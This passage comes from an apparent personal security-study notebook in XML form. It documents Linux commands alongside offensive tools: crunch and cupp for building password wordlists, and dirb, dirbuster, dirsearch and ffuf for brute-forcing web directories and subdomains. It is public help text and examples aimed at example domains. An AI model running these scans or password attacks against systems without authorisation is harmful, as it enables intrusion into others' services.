        <rich_text foreground="#2e2ec2c27e7e">ls</rich_text>
        <rich_text>
rwxrwxrwx		file

$ </rich_text>
        <rich_text foreground="#2e2ec2c27e7e">chmod</rich_text>
        <rich_text>	777	&lt;file&gt;
$ </rich_text>
        <rich_text foreground="#2e2ec2c27e7e">chmod</rich_text>
        <rich_text>	+rwx	&lt;file&gt;

# </rich_text>
        <rich_text foreground="#2e2ec2c27e7e">ls</rich_text>
        <rich_text>
rwxrwxrwx		file

Root		User		Others
rwx			rwx			rwx

r	=	Read
w	=	Write
x	=	Execute</rich_text>
      </node>
      <node name="chown" unique_id="67" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284498" ts_lastsave="1686722116">
        <rich_text>chown (1)            - change file owner and group
chown (2)            - change ownership of a file</rich_text>
      </node>
      <node name="chsh" unique_id="248" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685691802" ts_lastsave="1685691887">
        <rich_text scale="h1">Changing shells</rich_text>
        <rich_text>

Switch to bash
   ◇ chsh -s $(which bash)

Switch to zsh
   ◇ chsh -s $(which zsh)</rich_text>
      </node>
      <node name="clear" unique_id="95" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285050" ts_lastsave="1686722149">
        <rich_text>clear terminal page.</rich_text>
      </node>
      <node name="cmp" unique_id="126" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285218" ts_lastsave="1686722164">
        <rich_text>cmp (1)              - compare two files byte by byte
</rich_text>
      </node>
      <node name="comm" unique_id="127" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285223" ts_lastsave="1686722176">
        <rich_text>comm (1)             - compare two sorted files line by line</rich_text>
      </node>
      <node name="cp" unique_id="112" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285145" ts_lastsave="1727737266">
        <rich_text scale="h1" weight="heavy">cp</rich_text>
        <rich_text>
cp (1)               - copy files and directories

cp [Path/file.txt] [Path/new_file.txt]			# same Path, new Name
cp [Path/file.txt] [New_Path/file.txt]			# new Path, old Name
cp [Path/file.txt] [New_Path/new_file.txt]		# new Path and new Name</rich_text>
      </node>
      <node name="crunch" unique_id="233" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684287578" ts_lastsave="1729976028">
        <rich_text scale="h1" weight="heavy">$ crunch</rich_text>
        <rich_text>

Usage: crunch &lt;min&gt; &lt;max&gt; [options]

</rich_text>
        <rich_text foreground="#2e2ec2c27e7e">crunch</rich_text>
        <rich_text> 1 3 </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-o</rich_text>
        <rich_text> output.txt
</rich_text>
        <rich_text foreground="#9a9a99999696">00001	aaa
00002	bbb
		...
18278	zzz</rich_text>
        <rich_text>

</rich_text>
        <rich_text foreground="#2e2ec2c27e7e">crunch</rich_text>
        <rich_text> 9 9 1234567890abc </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-t</rich_text>
        <rich_text> secure</rich_text>
        <rich_text foreground="#ffffbebe6f6f">@@@</rich_text>
        <rich_text> </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-o</rich_text>
        <rich_text> output.txt
</rich_text>
        <rich_text foreground="#9a9a99999696">0001	secure</rich_text>
        <rich_text foreground="#ffffbebe6f6f">111</rich_text>
        <rich_text foreground="#9a9a99999696">
0002	secure</rich_text>
        <rich_text foreground="#ffffbebe6f6f">112</rich_text>
        <rich_text foreground="#9a9a99999696">
		...
2197	secure</rich_text>
        <rich_text foreground="#ffffbebe6f6f">ccc</rich_text>
      </node>
      <node name="cupp" unique_id="217" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286570" ts_lastsave="1686707935">
        <rich_text scale="h1" weight="heavy">$ cupp</rich_text>
        <rich_text>

usage: cupp [-h] [-i | -w FILENAME | -l | -a | -v] [-q]

options:
  -h, --help					show this help message and exit
  -i, --interactive			Interactive questions for user password profiling
  -w FILENAME			Use this option to improve existing dictionary, or WyD.pl output to make some pwnsauce
  -l								Download huge wordlists from repository
  -a							Parse default usernames and passwords directly from Alecto DB. ...
  -v, --version				Show the version of this program.
  -q, --quiet				Quiet mode (don't print banner)
</rich_text>
      </node>
      <node name="curl" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284097" ts_lastsave="1727578591">
        <rich_text scale="h1" weight="heavy">$ curl</rich_text>
        <rich_text>
curl (1)             - transfer a URL

Usage: curl [options...] &lt;url&gt;
 -d, --data &lt;data&gt;          HTTP POST data
 -f, --fail                 Fail fast with no output on HTTP errors
 -h, --help &lt;category&gt;      Get help for commands
 -i, --include              Include protocol response headers in the output
 -o, --output &lt;file&gt;        Write to file instead of stdout
 -O, --remote-name          Write output to a file named as the remote file
 -s, --silent               Silent mode
 -T, --upload-file &lt;file&gt;   Transfer local FILE to destination
 -u, --user &lt;user:password&gt; Server user and password
 -A, --user-agent &lt;name&gt;    Send User-Agent &lt;name&gt; to server
 -v, --verbose              Make the operation more talkative
 -V, --version              Show version number and quit


</rich_text>
        <rich_text weight="heavy">output:</rich_text>
        <rich_text>
curl </rich_text>
        <rich_text foreground="#777776767b7b">[URL]</rich_text>
        <rich_text foreground="#18b218">-o</rich_text>
        <rich_text>  foo.py

</rich_text>
        <rich_text weight="heavy">get services in header ( </rich_text>
        <rich_text>-I : --head</rich_text>
        <rich_text weight="heavy"> ):</rich_text>
        <rich_text>
curl </rich_text>
        <rich_text foreground="#18b218">-I </rich_text>
        <rich_text foreground="#777776767b7b">[URL]</rich_text>
        <rich_text>
curl </rich_text>
        <rich_text foreground="#18b218">--head</rich_text>
        <rich_text> </rich_text>
        <rich_text foreground="#777776767b7b">[URL]</rich_text>
        <rich_text>

</rich_text>
        <rich_text weight="heavy">custom user-agent:</rich_text>
        <rich_text>
curl </rich_text>
        <rich_text foreground="#18b218">--user-agent</rich_text>
        <rich_text> "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" </rich_text>
        <rich_text foreground="#777776767b7b">[URL]</rich_text>
        <rich_text>
</rich_text>
      </node>
      <node name="data" unique_id="132" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285262" ts_lastsave="1684285270"/>
      <node name="dd" unique_id="80" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284885" ts_lastsave="1686722275">
        <rich_text>converterdd (1)               - convert and copy a file</rich_text>
      </node>
      <node name="df" unique_id="158" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285452" ts_lastsave="1686722306">
        <rich_text scale="h1" weight="heavy">$ df</rich_text>
        <rich_text>

df (1)               - report file system space usage</rich_text>
      </node>
      <node name="diff" unique_id="124" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285210" ts_lastsave="1686722321">
        <rich_text>diff (1)             - compare files line by line</rich_text>
      </node>
      <node name="dig" unique_id="25" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283685" ts_lastsave="1686722334">
        <rich_text>dig (1)              - DNS lookup utility</rich_text>
      </node>
      <node name="dirb" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283375" ts_lastsave="1718596701">
        <rich_text scale="h1">dirb</rich_text>
        <rich_text> - Web Content Scanner


</rich_text>
        <rich_text scale="h2">options:</rich_text>
        <rich_text>
dirb &lt;ur&gt; &lt;dic&gt; -o &lt;output_name&gt;
</rich_text>
        <node name="man" unique_id="304" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1718596575" ts_lastsave="1718596685">
          <rich_text weight="heavy">DIRB(1)                     General Commands Manual                    DIRB(1)</rich_text>
          <rich_text>


NAME
       dirb - Web Content Scanner


SYNOPSIS
       dirb &lt;url_base&gt; &lt;url_base&gt; [&lt;wordlist_file(s)&gt;] [options]


DESCRIPTION
       DIRB  IS  a  Web Content Scanner. It looks for existing (and/or hidden)
       Web Objects. It basically works by launching a dictionary basesd attack
       against a web server and analizing the response.


OPTIONS
       -a &lt;agent_string&gt;
              Specify your custom USER_AGENT.  (Default is: "Mozilla/4.0 (com‐
              patible; MSIE 6.0; Windows NT 5.1)")

       -b     Don't squash or merge sequences of /../ or /./ in the given URL.

       -c &lt;cookie_string&gt;
              Set a cookie for the HTTP request.

       -E &lt;certificate&gt;
              Use the specified client certificate file.

       -f     Fine tunning of NOT_FOUND (404) detection.

       -H &lt;header_string&gt;
              Add a custom header to the HTTP request.

       -i     Use case-insensitive Search.

       -l     Print "Location" header when found.

       -N &lt;nf_code&gt;
              Ignore responses with this HTTP code.

       -o &lt;output_file&gt;
              Save output to disk.

       -p &lt;proxy[:port]&gt;
              Use this proxy. (Default port is 1080)

       -P &lt;proxy_username:proxy_password&gt;
              Proxy Authentication.

       -r     Don't Search Recursively.

       -R     Interactive Recursion.  (Ask in which directories  you  want  to
              scan)

       -S     Silent Mode. Don't show tested words. (For dumb terminals)

       -t     Don't force an ending '/' on URLs.

       -u &lt;username:password&gt;
              Username and password to use.

       -v     Show Also Not Existent Pages.

       -w     Don't Stop on WARNING messages.

       -x &lt;extensions_file&gt;
              Amplify search with the extensions on this file.

       -X &lt;extensions&gt;
              Amplify search with this extensions.

       -z &lt;milisecs&gt;
              Amplify search with this extensions.


SEE ALSO
       brain(x)

The Dark Raver                    27/01/2009                           DIRB(1)
</rich_text>
        </node>
      </node>
      <node name="dirbuster (GUI)" unique_id="14" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283381" ts_lastsave="1724731273">
        <rich_text scale="h1" weight="heavy">dirbuster</rich_text>
        <rich_text>

dirbuster			- direction scan throw web with </rich_text>
        <rich_text foreground="#ffffbebe6f6f">GUI</rich_text>
        <node name="--help" unique_id="343" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724731151" ts_lastsave="1724731153">
          <rich_text>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
DirBuster - 1.0-RC1
Usage: java -jar DirBuster-1.0-RC1 -u &lt;URL http://example.com/&gt; [Options]

        Options:
         -h : Display this help message
         -H : Start DirBuster in headless mode (no gui), report will be auto saved on exit
         -l &lt;Word list to use&gt; : The Word list to use for the list based brute force. Default: /home/nightfox/directory-list-2.3-small.txt
         -g : Only use GET requests. Default Not Set
         -e &lt;File Extention list&gt; : File Extention list eg asp,aspx. Default: php
         -t &lt;Number of Threads&gt; : Number of connection threads to use. Default: 10
         -s &lt;Start point&gt; : Start point of the scan. Default: /
         -v : Verbose output, Default: Not set
         -P : Don't Parse html, Default: Not Set
         -R : Don't be recursive, Default: Not Set
         -r &lt;location&gt; : File to save report to. Default: /home/nightfox/DirBuster-Report-[hostname]-[port].txt

Examples:

Run DirBuster in headless mode
java -jar DirBuster-1.0-RC1.jar -H -u https://www.target.com/

Start GUI with target prepopulated
java -jar DirBuster-1.0-RC1.jar -u https://www.target.com/
</rich_text>
        </node>
      </node>
      <node name="dirsearch" unique_id="198" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285988" ts_lastsave="1724731434">
        <rich_text scale="h1" weight="heavy">dirsearch</rich_text>
        <rich_text>

$ dirsearch

dirsearch (1)        - An advanced command-line tool designed to brute force directories and files in webservers</rich_text>
      </node>
      <node name="dmesg" unique_id="189" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285843" ts_lastsave="1686722402">
        <rich_text>dmesg (1)            - print or control the kernel ring buffer</rich_text>
      </node>
      <node name="dnf" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284964" ts_lastsave="1684284969"/>
      <node name="dpkg" unique_id="86" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284994" ts_lastsave="1684285000"/>
      <node name="du" unique_id="159" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285457" ts_lastsave="1684285462"/>
      <node name="dump" unique_id="220" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286910" ts_lastsave="1686723529">
        <rich_text scale="h1" weight="heavy">$ look
</rich_text>
        <rich_text>look (1)             - display lines beginning with a given string

$ look root
root
rooted
rooter
rooting
rootless
root's
roots</rich_text>
      </node>
      <node name="echo" unique_id="107" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285125" ts_lastsave="1728581016">
        <rich_text>echo $0						# Finding current shell
echo $PATH					# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin (commands path)
echo $SHELL					# </rich_text>
        <rich_text link="file L3Vzci9iaW4venNo">/usr/bin/zsh</rich_text>
        <rich_text> (default shell)



</rich_text>
        <rich_text scale="h3" weight="heavy">• another way to create hashed text</rich_text>
        <rich_text>  </rich_text>
        <rich_text foreground="#9a9a99999696">(see </rich_text>
        <rich_text foreground="#9a9a99999696" weight="heavy">openssl</rich_text>
        <rich_text foreground="#9a9a99999696">, </rich_text>
        <rich_text foreground="#9a9a99999696" weight="heavy">ssh-key</rich_text>
        <rich_text foreground="#9a9a99999696"> too)</rich_text>
        <rich_text>
echo -n 'bob' | md5sum
echo -n 'bob' | md5sum  | cut -d' ' -f1 &gt;&gt;hash.txt

echo ‘x’ </rich_text>
        <rich_text foreground="#a5a51d1d2d2d" weight="heavy">&gt;</rich_text>
        <rich_text> text				# write / re-write
echo ‘x’ </rich_text>
        <rich_text foreground="#a5a51d1d2d2d" weight="heavy">&gt;&gt;</rich_text>
        <rich_text> text			# append</rich_text>
      </node>
      <node name="enum4linux" unique_id="19" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283548" ts_lastsave="1684283574"/>
      <node name="env" unique_id="166" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285485" ts_lastsave="1685693428"/>
      <node name="ethtool" unique_id="156" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285424" ts_lastsave="1684285452"/>
      <node name="exit" unique_id="94" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285046" ts_lastsave="1684287066"/>
      <node name="exo-open" unique_id="292" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1718588215" ts_lastsave="1718588821">
        <rich_text background="#3d3d38384646">exo-open (1)         - Open URLs and launch preferred applications</rich_text>
        <rich_text>

Usage: exo-open [URLs...]
       exo-open --launch TYPE [PARAMETERs...]

  -?, --help                          Print this help message and exit
  -V, --version                       Print version information and exit

  --launch TYPE [PARAMETERs...]       Launch the preferred application of
                                      TYPE with the optional PARAMETERs, where
                                      TYPE is one of the following values.

  --working-directory DIRECTORY       Default working directory for applications
                                      when using the --launch option.

The following TYPEs are supported for the --launch command:

  WebBrowser       - The preferred Web Browser.
  MailReader       - The preferred Mail Reader.
  FileManager      - The preferred File Manager.
  TerminalEmulator - The preferred Terminal Emulator.
</rich_text>
      </node>
      <node name="faraday" unique_id="23" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283662" ts_lastsave="1684283680"/>
      <node name="ffuf" unique_id="88" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285003" ts_lastsave="1729979111">
        <rich_text scale="h1" weight="heavy">ffuf</rich_text>
        <rich_text>
ffuf (1)             - Fast web fuzzer written in Go


</rich_text>
        <rich_text scale="h3" weight="heavy">Simple:</rich_text>
        <rich_text>

</rich_text>
        <rich_text foreground="#2626a2a26969">ffuf</rich_text>
        <rich_text> </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-w</rich_text>
        <rich_text> &lt;dict&gt; </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-u</rich_text>
        <rich_text> https://example.org/FUZZ </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-e</rich_text>
        <rich_text> html,php </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-mc</rich_text>
        <rich_text> all </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-fc</rich_text>
        <rich_text> 400,404 </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-t</rich_text>
        <rich_text> 500 </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-c -v</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#2626a2a26969">ffuf</rich_text>
        <rich_text> </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-w </rich_text>
        <rich_text>&lt;dict&gt;:FOO </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-u</rich_text>
        <rich_text> https://example.org/FOO </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-mc</rich_text>
        <rich_text> all </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-fc</rich_text>
        <rich_text> 400,404 </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-t</rich_text>
        <rich_text> 100 </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-c -v</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#2626a2a26969">ffuf</rich_text>
        <rich_text> </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-w </rich_text>
        <rich_text>&lt;dict&gt;:FOO </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-w</rich_text>
        <rich_text> &lt;dict&gt;:BOO </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-u</rich_text>
        <rich_text> https://example.org/FOO.BOO </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-mc</rich_text>
        <rich_text> all </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-fc</rich_text>
        <rich_text> 400,404</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4"> -c -v</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h3" weight="heavy">DNS</rich_text>
        <rich_text>(subdomain)</rich_text>
        <rich_text scale="h3" weight="heavy">:</rich_text>
        <rich_text>

</rich_text>
        <rich_text foreground="#2626a2a26969">ffuf</rich_text>
        <rich_text> </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-c -w</rich_text>
        <rich_text> /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-u</rich_text>
        <rich_text> http://example.com </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-H</rich_text>
        <rich_text> "Host: FUZZ.example.com" </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-mc</rich_text>
        <rich_text> 200
</rich_text>
        <rich_text foreground="#2626a2a26969">ffuf</rich_text>
        <rich_text> </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-c -w</rich_text>
        <rich_text>  /usr/share/wordlists/dirb/common.txt </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-u</rich_text>
        <rich_text> http://</rich_text>
        <rich_text foreground="#f8f8e4e45c5c">example.com</rich_text>
        <rich_text>/FUZZ </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-e</rich_text>
        <rich_text> html,php,txt </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-H</rich_text>
        <rich_text> "Host: </rich_text>
        <rich_text foreground="#e5e5a5a50a0a">welcome.</rich_text>
        <rich_text foreground="#f8f8e4e45c5c">example.com</rich_text>
        <rich_text>" </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-mc</rich_text>
        <rich_text> 200</rich_text>
        <rich_text family="monospace">
</rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h3" weight="heavy">Example</rich_text>
        <rich_text>(help)</rich_text>
        <rich_text scale="h3" weight="heavy">:</rich_text>
        <rich_text>

Fuzz file paths from wordlist.txt, match all responses but filter out those with content-size 42. Colored, verbose output.
	ffuf -w wordlist.txt -u </rich_text>
        <rich_text link="webs https://example.org/FUZZ">https://example.org/FUZZ</rich_text>
        <rich_text> -mc all -fs 42 -c -v

Fuzz Host-header, match HTTP 200 responses.
	ffuf -w hosts.txt -u </rich_text>
        <rich_text link="webs https://example.org/">https://example.org/</rich_text>
        <rich_text> -H "Host: FUZZ" -mc 200

Fuzz POST JSON data. Match all responses not containing text "error".
	ffuf -w entries.txt -u </rich_text>
        <rich_text link="webs https://example.org/">https://example.org/</rich_text>
        <rich_text> -X POST -H "Content-Type: application/json" \
	-d '{"name": "FUZZ", "anotherkey": "anothervalue"}' -fr "error"

Fuzz multiple locations. Match only responses reflecting the value of "VAL" keyword. Colored.
	ffuf -w params.txt:PARAM -w values.txt:VAL -u </rich_text>
        <rich_text link="webs https://example.org/?PARAM=VAL">https://example.org/?PARAM=VAL</rich_text>
        <rich_text> -mr "VAL" -c

</rich_text>
        <node name="--help" unique_id="388" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728552656" ts_lastsave="1729978501">
          <rich_text>Fuzz Faster U Fool - v2.1.0-dev

HTTP OPTIONS:
  -H                  Header `"Name: Value"`, separated by colon. Multiple -H flags are accepted.
</rich_text>
          <rich_text foreground="#f6f661615151">  -X                  HTTP method to use</rich_text>
          <rich_text>
</rich_text>
          <rich_text foreground="#f6f661615151">  -b                  Cookie data `"NAME1=VALUE1; NAME2=VALUE2"` for copy as curl functionality.</rich_text>
          <rich_text>
  -cc                 Client cert for authentication. Client key needs to be defined as well for this to work
  -ck                 Client key for authentication. Client certificate needs to be defined as well for this to work
</rich_text>
          <rich_text foreground="#f6f661615151">  -d                  POST data</rich_text>
          <rich_text>
  -http2              Use HTTP2 protocol (default: false)
  -ignore-body        Do not fetch the response content. (default: false)
</rich_text>
          <rich_text foreground="#f6f661615151">  -r                  Follow redirects (default: false)
  -raw                Do not encode URI (default: false)</rich_text>
          <rich_text>
  -recursion          Scan recursively. Only FUZZ keyword is supported, and URL (-u) has to end in it. (default: false)
</rich_text>
          <rich_text foreground="#f6f661615151">  -recursion-depth    Maximum recursion depth. (default: 0)</rich_text>
          <rich_text>
  -recursion-strategy Recursion strategy: "default" for a redirect based, and "greedy" to recurse on all matches (default: default)
</rich_text>
          <rich_text foreground="#f6f661615151">  -replay-proxy       Replay matched requests using this proxy.</rich_text>
          <rich_text>
  -sni                Target TLS SNI, does not support FUZZ keyword
</rich_text>
          <rich_text foreground="#f6f661615151">  -timeout            HTTP request timeout in seconds. (default: 10)</rich_text>
          <rich_text>
</rich_text>
          <rich_text foreground="#f6f661615151">  -u                  Target URL</rich_text>
          <rich_text>
  -x                  Proxy URL (SOCKS5 or HTTP). For example: http://127.0.0.1:8080 or socks5://127.0.0.1:8080

GENERAL OPTIONS:
  -V                  Show version information. (default: false)
  -ac                 Automatically calibrate filtering options (default: false)
  -acc                Custom auto-calibration string. Can be used multiple times. Implies -ac
  -ach                Per host autocalibration (default: false)
  -ack                Autocalibration keyword (default: FUZZ)
  -acs                Custom auto-calibration strategies. Can be used multiple times. Implies -ac
</rich_text>
          <rich_text foreground="#f6f661615151" weight="heavy">  -c                  Colorize output. (default: false)</rich_text>
          <rich_text>
  -config             Load configuration from a file
</rich_text>
          <rich_text foreground="#f6f661615151">  -json               JSON output, printing newline-delimited JSON records (default: false)</rich_text>
          <rich_text>
  -maxtime            Maximum running time in seconds for entire process. (default: 0)
  -maxtime-job        Maximum running time in seconds per job. (default: 0)
  -noninteractive     Disable the interactive console functionality (default: false)
  -p                  Seconds of `delay` between requests, or a range of random delay. For example "0.1" or "0.1-2.0"
  -rate               Rate of requests per second (default: 0)
</rich_text>
          <rich_text foreground="#f6f661615151">  -s                  Do not print additional information (silent mode) (default: false)</rich_text>
          <rich_text>
  -sa                 Stop on all error cases. Implies -sf and -se. (default: false)
  -scraperfile        Custom scraper file path
  -scrapers           Active scraper groups (default: all)
  -se                 Stop on spurious errors (default: false)
  -search             Search for a FFUFHASH payload from ffuf history
  -sf                 Stop when &gt; 95% of responses return 403 Forbidden (default: false)
</rich_text>
          <rich_text foreground="#f6f661615151">  -t                  Number of concurrent threads. (default: 40)</rich_text>
          <rich_text>
</rich_text>
          <rich_text foreground="#f6f661615151">  -v                  Verbose output, printing full URL and redirect location (if any) with the results. (default: false)</rich_text>
          <rich_text>

</rich_text>
          <rich_text foreground="#8f8ff0f0a4a4">MATCHER OPTIONS:
 </rich_text>
          <rich_text foreground="#8f8ff0f0a4a4" weight="heavy"> -mc       ...       Match HTTP status codes, or "all" for everything. (default: 200-299,301,302,307,401,403,405,500)</rich_text>
          <rich_text foreground="#8f8ff0f0a4a4">
  -ml                 Match amount of lines in response
  -mmode              Matcher set operator. Either of: and, or (default: or)
  -mr                 Match regexp
  -ms                 Match HTTP response size
  -mt                 Match how many milliseconds to the first response byte, either greater or less than. EG: &gt;100 or &lt;100
  -mw                 Match amount of words in response</rich_text>
          <rich_text>

</rich_text>
          <rich_text foreground="#f9f9f0f06b6b">FILTER OPTIONS:
</rich_text>
          <rich_text foreground="#f9f9f0f06b6b" weight="heavy">  -fc       ...       Filter HTTP status codes from response. Comma separated list of codes and ranges</rich_text>
          <rich_text foreground="#f9f9f0f06b6b">
  -fl                 Filter by amount of lines in response. Comma separated list of line counts and ranges
  -fmode              Filter set operator. Either of: and, or (default: or)
  -fr                 Filter regexp
  -fs                 Filter HTTP response size. Comma separated list of sizes and ranges
  -ft                 Filter by number of milliseconds to the first response byte, either greater or less than. EG: &gt;100 or &lt;100
  -fw                 Filter by amount of words in response. Comma separated list of word counts and ranges</rich_text>
          <rich_text>

INPUT OPTIONS:
  -D                  DirSearch wordlist compatibility mode. Used in conjunction with -e flag. (default: false)
</rich_text>
          <rich_text foreground="#f6f661615151" weight="heavy">  -e                  Comma separated list of extensions. Extends FUZZ keyword.</rich_text>
          <rich_text>
  -enc                Encoders for keywords, eg. 'FUZZ:urlencode b64encode'
  -ic                 Ignore wordlist comments (default: false)
  -input-cmd          Command producing the input. --input-num is required when using this input method. Overrides -w.
  -input-num          Number of inputs to test. Used in conjunction with --input-cmd. (default: 100)
  -input-shell        Shell to be used for running command
  -mode               Multi-wordlist operation mode. Available modes: clusterbomb, pitchfork, sniper (default: clusterbomb)
  -request            File containing the raw http request
  -request-proto      Protocol to use along with raw request (default: https)
  -w                  Wordlist file path and (optional) keyword separated by colon. eg. '/path/to/wordlist:KEYWORD'

OUTPUT OPTIONS:
  -debug-log          Write all of the internal logging to the specified file.
</rich_text>
          <rich_text foreground="#f6f661615151">  -o                  Write output to file</rich_text>
          <rich_text>
  -od                 Directory path to store matched results to.
  -of                 Output file format. Available formats: json, ejson, html, md, csv, ecsv (or, 'all' for all formats) (default: json)
  -or                 Don't create the output file if we don't have results (default: false)

EXAMPLE USAGE:
  Fuzz file paths from wordlist.txt, match all responses but filter out those with content-size 42.
  Colored, verbose output.
</rich_text>
          <rich_text foreground="#6262a0a0eaea">    ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v</rich_text>
          <rich_text>

  Fuzz Host-header, match HTTP 200 responses.
</rich_text>
          <rich_text foreground="#6262a0a0eaea">    ffuf -w hosts.txt -u https://example.org/ -H "Host: FUZZ" -mc 200</rich_text>
          <rich_text>

  Fuzz POST JSON data. Match all responses not containing text "error".
</rich_text>
          <rich_text foreground="#6262a0a0eaea">    ffuf -w entries.txt -u https://example.org/ -X POST -H "Content-Type: application/json" \
      -d '{"name": "FUZZ", "anotherkey": "anothervalue"}' -fr "error"</rich_text>
          <rich_text>

  Fuzz multiple locations. Match only responses reflecting the value of "VAL" keyword. Colored.
</rich_text>
